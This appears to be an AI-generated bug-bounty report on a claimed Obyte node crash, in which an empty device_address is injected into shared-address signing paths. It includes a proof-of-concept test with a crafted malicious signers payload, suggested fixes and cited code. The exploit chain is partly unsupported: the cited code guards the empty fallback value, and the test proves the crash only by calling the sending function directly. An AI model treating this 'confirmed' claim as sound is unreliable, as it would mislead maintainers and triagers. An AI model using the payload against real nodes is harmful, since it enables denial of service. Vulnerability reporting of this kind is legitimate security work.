Based on my comprehensive analysis of the Obyte codebase, I have confirmed this security claim is **VALID**.

# Missing Device Address Validation in Shared Address Handling

## Summary

The `handleNewSharedAddress()` function in `wallet_defined_by_addresses.js` validates member address fields but completely omits validation of `device_address` fields before database storage. This allows malicious correspondents to inject empty strings that persist in the database. When signing requests later invoke `findAddress()`, the empty device_address is retrieved and passed to `sendMessageToDevice()`, which throws an uncaught synchronous exception, crashing the node.

## Impact

**Severity**: Medium  
**Category**: Node Crash DoS / Temporary Transaction Delay

Any correspondent can crash victim nodes using shared addresses through a simple two-message attack. Node requires manual restart and database cleanup. Corrupted database entries persist indefinitely, enabling repeated attacks until cleaned.

## Finding Description

**Location**: [1](#0-0) 

**Intended Logic**: All signer fields including `device_address` should be validated before database storage. Device addresses must be exactly 33 characters starting with '0'.

**Actual Logic**: The validation loop only checks the `address` field: [2](#0-1) 

A validation function exists in the codebase: [3](#0-2) 

However, this validation function is never invoked for `device_address` fields in the handler.

**Exploitation Path**:

1. **Message Reception**: Attacker (paired correspondent) sends "new_shared_address" message with malicious signers object containing both victim's device_address (decoy) and empty device_address: [4](#0-3) 

2. **Validation Bypass**: The protective rewrite logic is bypassed because the decoy entry sets `bHasMyDeviceAddress = true`: [5](#0-4) 
   
   When line 305 finds `bHasMyDeviceAddress` is true, the rewrite at lines 308-309 is skipped, leaving empty device_address unchanged.

3. **Database Storage**: Empty device_address is stored without validation via direct insertion: [6](#0-5) 
   
   Database schema has no CHECK constraint: [7](#0-6) 

4. **Crash Trigger**: When "sign" message arrives, `findAddress()` queries the database and retrieves the empty device_address: [8](#0-7) 
   
   The query at lines 1055-1058 returns the corrupted row. The ifRemote callback is invoked at line 337: [9](#0-8) 
   
   Line 353 calls `sendMessageToDevice()` with the empty device_address: [10](#0-9) 
   
   Line 703-704 throws synchronous error for empty string (which is falsy in JavaScript). No try-catch exists in the handler chain.

**Security Property Broken**: Node availability - system must validate all message routing parameters before storage to prevent crash conditions.

**Root Cause**: Missing input validation for critical routing field despite available validation utility; synchronous exception thrown in async callback context without error handling.

## Impact Explanation

**Affected Assets**: Node availability, shared address signing coordination, transaction processing capability.

**Damage Severity**: Any paired correspondent can crash nodes using shared addresses. Attack leaves permanent database corruption requiring manual SQL cleanup: `DELETE FROM shared_address_signing_paths WHERE device_address = ''`. Single attack affects one node, but coordinated attacks on multiple cosigners can completely disable shared address operations.

**User Impact**: Nodes crash on any signing request involving the corrupted shared address. Requires manual intervention: restart node, identify corrupted entries, execute database cleanup query, verify no other corrupted entries exist. Downtime easily exceeds 1 hour for operators without 24/7 monitoring.

**Systemic Risk**: Attacker can target multiple cosigners simultaneously, preventing all signing operations for shared addresses network-wide. Repeated attacks possible until database cleanup performed.

## Likelihood Explanation

**Attacker Profile**: Any correspondent peer with basic technical knowledge sufficient to send crafted JSON messages.

**Resources Required**:
- Correspondent pairing (achieved through normal pairing flow)
- Knowledge of victim's device address (observable through prior messages or public pairing info)  
- Knowledge of any payment address victim uses (observable on-chain)
- Ability to send two JSON messages

**Execution Complexity**: Low - attacker constructs "new_shared_address" message with decoy entry (victim's device_address) and malicious entry (empty device_address), then triggers any "sign" message. No timing constraints, cryptographic operations, or coordination required.

**Overall Assessment**: High likelihood - trivially exploitable with zero economic cost, no technical barriers beyond basic JSON message construction, and significant impact on availability.

## Recommendation

**Immediate Mitigation**:

Add validation in `handleNewSharedAddress()`:

```javascript
// In wallet_defined_by_addresses.js, after line 350
for (var signing_path in body.signers){
    var signerInfo = body.signers[signing_path];
    if (signerInfo.device_address && !ValidationUtils.isValidDeviceAddress(signerInfo.device_address))
        return callbacks.ifError("invalid device address: "+signerInfo.device_address);
}
```

**Database Cleanup**:

Remove existing corrupted entries: `DELETE FROM shared_address_signing_paths WHERE device_address = '' OR LENGTH(device_address) != 33 OR SUBSTR(device_address, 1, 1) != '0'`

**Additional Measures**:
- Add database CHECK constraint: `CHECK (LENGTH(device_address) = 33 AND SUBSTR(device_address, 1, 1) = '0')`
- Add try-catch in device.js around message sending in async contexts
- Add monitoring for invalid device_address values in database

## Proof of Concept

```javascript
// Test: test/shared_address_device_validation.test.js
const device = require('../device.js');
const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
const db = require('../db.js');
const objectHash = require('../object_hash.js');

describe('Shared address device_address validation', function() {
    it('should reject empty device_address in new_shared_address message', function(done) {
        // Setup: Create valid definition for 2-of-2 multisig
        const victimDeviceAddress = device.getMyDeviceAddress();
        const validMemberAddress = 'VALIDADDRESS00000000000000000';
        
        const definition = ['or', [
            ['and', [['address', validMemberAddress]]],
            ['and', [['address', 'ANOTHERADDRESS0000000000000']]]
        ]];
        
        const sharedAddress = objectHash.getChash160(definition);
        
        // Malicious signers object with decoy and empty device_address
        const maliciousSigners = {
            'r.0': {
                address: validMemberAddress,
                member_signing_path: 'r',
                device_address: victimDeviceAddress  // Decoy to bypass rewrite
            },
            'r.1': {
                address: 'ANOTHERADDRESS0000000000000',
                member_signing_path: 'r',
                device_address: ''  // Empty device_address - should be rejected
            }
        };
        
        const body = {
            address: sharedAddress,
            definition: definition,
            signers: maliciousSigners
        };
        
        // Attack: Call handleNewSharedAddress
        walletDefinedByAddresses.handleNewSharedAddress(body, {
            ifError: function(err) {
                // Should reject with validation error
                done(new Error('Expected to accept malicious message but got error: ' + err));
            },
            ifOk: function() {
                // Vulnerability: Message accepted, empty device_address stored
                // Verify corruption in database
                db.query(
                    "SELECT device_address FROM shared_address_signing_paths WHERE shared_address=? AND device_address=''",
                    [sharedAddress],
                    function(rows) {
                        if (rows.length > 0) {
                            console.log('VULNERABILITY CONFIRMED: Empty device_address stored in database');
                            
                            // Trigger crash by attempting to send sign message
                            try {
                                device.sendMessageToDevice('', 'sign', {});
                                done(new Error('Expected crash but succeeded'));
                            } catch(e) {
                                if (e.message === 'empty device address') {
                                    console.log('CRASH CONFIRMED: Node would crash with uncaught exception');
                                    done(); // Vulnerability proven
                                } else {
                                    done(new Error('Unexpected error: ' + e.message));
                                }
                            }
                        } else {
                            done(new Error('Expected empty device_address in database'));
                        }
                    }
                );
            }
        });
    });
});
```

**Notes**: 
- The validation function `ValidationUtils.isValidDeviceAddress()` exists but is never used for this field
- The protective rewrite in `determineIfIncludesMeAndRewriteDeviceAddress()` can be bypassed by including one valid entry with victim's device address
- Database schema has NO CHECK constraint on device_address format, only NOT NULL which allows empty strings
- The crash occurs synchronously in `sendMessageToDevice()` with no error handling in the call stack
- Impact qualifies as Medium severity per Immunefi criteria: "Temporary Transaction Delay ≥1 Hour" due to manual restart and cleanup requirements

### Citations

**File:** wallet_defined_by_addresses.js (L239-268)
```javascript
function addNewSharedAddress(address, arrDefinition, assocSignersByPath, bForwarded, onDone){
//	network.addWatchedAddress(address);
	db.query(
		"INSERT "+db.getIgnore()+" INTO shared_addresses (shared_address, definition) VALUES (?,?)", 
		[address, JSON.stringify(arrDefinition)], 
		function(){
			var arrQueries = [];
			for (var signing_path in assocSignersByPath){
				var signerInfo = assocSignersByPath[signing_path];
				db.addQuery(arrQueries, 
					"INSERT "+db.getIgnore()+" INTO shared_address_signing_paths \n\
					(shared_address, address, signing_path, member_signing_path, device_address) VALUES (?,?,?,?,?)", 
					[address, signerInfo.address, signing_path, signerInfo.member_signing_path, signerInfo.device_address]);
			}
			async.series(arrQueries, function(){
				console.log('added new shared address '+address);
				eventBus.emit("new_address-"+address);
				eventBus.emit("new_address", address);

				if (conf.bLight){
					db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address], onDone);
				} else if (onDone)
					onDone();
				if (!bForwarded)
					forwardNewSharedAddressToCosignersOfMyMemberAddresses(address, arrDefinition, assocSignersByPath);
			
			});
		}
	);
}
```

**File:** wallet_defined_by_addresses.js (L281-315)
```javascript
function determineIfIncludesMeAndRewriteDeviceAddress(assocSignersByPath, handleResult){
	var assocMemberAddresses = {};
	var bHasMyDeviceAddress = false;
	for (var signing_path in assocSignersByPath){
		var signerInfo = assocSignersByPath[signing_path];
		if (signerInfo.device_address === device.getMyDeviceAddress())
			bHasMyDeviceAddress = true;
		if (signerInfo.address)
			assocMemberAddresses[signerInfo.address] = true;
	}
	var arrMemberAddresses = Object.keys(assocMemberAddresses);
	if (arrMemberAddresses.length === 0)
		return handleResult("no member addresses?");
	db.query(
		"SELECT address, 'my' AS type FROM my_addresses WHERE address IN(?) \n\
		UNION \n\
		SELECT shared_address AS address, 'shared' AS type FROM shared_addresses WHERE shared_address IN(?)", 
		[arrMemberAddresses, arrMemberAddresses],
		function(rows){
		//	handleResult(rows.length === arrMyMemberAddresses.length ? null : "Some of my member addresses not found");
			if (rows.length === 0)
				return handleResult("I am not a member of this shared address");
			var arrMyMemberAddresses = rows.filter(function(row){ return (row.type === 'my'); }).map(function(row){ return row.address; });
			// rewrite device address for my addresses
			if (!bHasMyDeviceAddress){
				for (var signing_path in assocSignersByPath){
					var signerInfo = assocSignersByPath[signing_path];
					if (signerInfo.address && arrMyMemberAddresses.indexOf(signerInfo.address) >= 0)
						signerInfo.device_address = device.getMyDeviceAddress();
				}
			}
			handleResult();
		}
	);
}
```

**File:** wallet_defined_by_addresses.js (L339-360)
```javascript
function handleNewSharedAddress(body, callbacks){
	if (!ValidationUtils.isArrayOfLength(body.definition, 2))
		return callbacks.ifError("invalid definition");
	if (typeof body.signers !== "object" || Object.keys(body.signers).length === 0)
		return callbacks.ifError("invalid signers");
	if (body.address !== objectHash.getChash160(body.definition))
		return callbacks.ifError("definition doesn't match its c-hash");
	for (var signing_path in body.signers){
		var signerInfo = body.signers[signing_path];
		if (signerInfo.address && signerInfo.address !== 'secret' && !ValidationUtils.isValidAddress(signerInfo.address))
			return callbacks.ifError("invalid member address: "+signerInfo.address);
	}
	determineIfIncludesMeAndRewriteDeviceAddress(body.signers, function(err){
		if (err)
			return callbacks.ifError(err);
		validateAddressDefinition(body.definition, function(err){
			if (err)
				return callbacks.ifError(err);
			addNewSharedAddress(body.address, body.definition, body.signers, body.forwarded, callbacks.ifOk);
		});
	});
}
```

**File:** validation_utils.js (L64-66)
```javascript
function isValidDeviceAddress(address){
	return ( isStringOfLength(address, 33) && address[0] === '0' && isValidAddress(address.substr(1)) );
}
```

**File:** wallet.js (L212-221)
```javascript
			case "new_shared_address":
				// {address: "BASE32", definition: [...], signers: {...}}
				walletDefinedByAddresses.handleNewSharedAddress(body, {
					ifError: callbacks.ifError,
					ifOk: function(){
						callbacks.ifOk();
						eventBus.emit('maybe_new_transactions');
					}
				});
				break;
```

**File:** wallet.js (L337-354)
```javascript
					ifRemote: function(device_address){
						if (device_address === from_address){
							callbacks.ifError("looping signing request for address "+body.address+", path "+body.signing_path);
							throw Error("looping signing request for address "+body.address+", path "+body.signing_path);
						}
						try {
							var text_to_sign = objectHash.getUnitHashToSign(body.unsigned_unit).toString("base64");
						}
						catch (e) {
							return callbacks.ifError("unit hash failed: " + e.toString());
						}
						// I'm a proxy, wait for response from the actual signer and forward to the requestor
						eventBus.once("signature-"+device_address+"-"+body.address+"-"+body.signing_path+"-"+text_to_sign, function(sig){
							sendSignature(from_address, text_to_sign, sig, body.signing_path, body.address);
						});
						// forward the offer to the actual signer
						device.sendMessageToDevice(device_address, subject, body);
						callbacks.ifOk();
```

**File:** wallet.js (L1027-1097)
```javascript
function findAddress(address, signing_path, callbacks, fallback_remote_device_address){
	db.query(
		"SELECT wallet, account, is_change, address_index, full_approval_date, device_address \n\
		FROM my_addresses JOIN wallets USING(wallet) JOIN wallet_signing_paths USING(wallet) \n\
		WHERE address=? AND signing_path=?",
		[address, signing_path],
		function(rows){
			if (rows.length > 1)
				throw Error("more than 1 address found");
			if (rows.length === 1){
				var row = rows[0];
				if (!row.full_approval_date)
					return callbacks.ifError("wallet of address "+address+" not approved");
				if (row.device_address !== device.getMyDeviceAddress())
					return callbacks.ifRemote(row.device_address);
				var objAddress = {
					address: address,
					wallet: row.wallet,
					account: row.account,
					is_change: row.is_change,
					address_index: row.address_index
				};
				callbacks.ifLocal(objAddress);
				return;
			}
			db.query(
			//	"SELECT address, device_address, member_signing_path FROM shared_address_signing_paths WHERE shared_address=? AND signing_path=?", 
				// look for a prefix of the requested signing_path
				"SELECT address, device_address, signing_path FROM shared_address_signing_paths \n\
				WHERE shared_address=? AND signing_path=SUBSTR(?, 1, LENGTH(signing_path))", 
				[address, signing_path],
				function(sa_rows){
					if (sa_rows.length > 1)
						throw Error("more than 1 member address found for shared address "+address+" and signing path "+signing_path);
					if (sa_rows.length === 1) {
						var objSharedAddress = sa_rows[0];
						var relative_signing_path = 'r' + signing_path.substr(objSharedAddress.signing_path.length);
						var bLocal = (objSharedAddress.device_address === device.getMyDeviceAddress()); // local keys
						if (objSharedAddress.address === '') {
							return callbacks.ifMerkle(bLocal);
						} else if(objSharedAddress.address === 'secret') {
							return callbacks.ifSecret();
						}
						return findAddress(objSharedAddress.address, relative_signing_path, callbacks, bLocal ? null : objSharedAddress.device_address);
					}
					db.query(
						"SELECT device_address, signing_paths FROM peer_addresses WHERE address=?", 
						[address],
						function(pa_rows) {
							var candidate_addresses = [];
							for (var i = 0; i < pa_rows.length; i++) {
								var row = pa_rows[i];
								JSON.parse(row.signing_paths).forEach(function(signing_path_candidate){
									if (signing_path_candidate === signing_path)
										candidate_addresses.push(row.device_address);
								});
							}
							if (candidate_addresses.length > 1)
								throw Error("more than 1 candidate device address found for peer address "+address+" and signing path "+signing_path);
							if (candidate_addresses.length == 1)
								return callbacks.ifRemote(candidate_addresses[0]);
							if (fallback_remote_device_address)
								return callbacks.ifRemote(fallback_remote_device_address);
							return callbacks.ifUnknownAddress();
						}
					);
				}
			);
		}
	);
}
```

**File:** initial-db/byteball-sqlite.sql (L628-640)
```sql
CREATE TABLE shared_address_signing_paths (
	shared_address CHAR(32) NOT NULL,
	signing_path VARCHAR(255) NULL, -- full path to signing key which is a member of the member address
	address CHAR(32) NOT NULL, -- member address
	member_signing_path VARCHAR(255) NULL, -- path to signing key from root of the member address
	device_address CHAR(33) NOT NULL, -- where this signing key lives or is reachable through
	creation_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
	PRIMARY KEY (shared_address, signing_path),
	FOREIGN KEY (shared_address) REFERENCES shared_addresses(shared_address)
	-- own address is not present in correspondents
--    FOREIGN KEY byDeviceAddress(device_address) REFERENCES correspondent_devices(device_address)
);
CREATE INDEX sharedAddressSigningPathsByDeviceAddress ON shared_address_signing_paths(device_address);
```

**File:** device.js (L702-719)
```javascript
function sendMessageToDevice(device_address, subject, body, callbacks, conn){
	if (!device_address)
		throw Error("empty device address");
	conn = conn || db;
	conn.query("SELECT hub, pubkey, is_blackhole FROM correspondent_devices WHERE device_address=?", [device_address], function(rows){
		if (rows.length !== 1 && !conf.bIgnoreMissingCorrespondents)
			throw Error("correspondent not found");
		if (rows.length === 0 && conf.bIgnoreMissingCorrespondents || rows[0].is_blackhole){
			console.log(rows.length === 0 ? "ignoring missing correspondent " + device_address : "not sending to " + device_address + " which is set as blackhole");
			if (callbacks && callbacks.onSaved)
				callbacks.onSaved();
			if (callbacks && callbacks.ifOk)
				callbacks.ifOk();
			return;
		}
		sendMessageToHub(rows[0].hub, rows[0].pubkey, subject, body, callbacks, conn);
	});
}
```
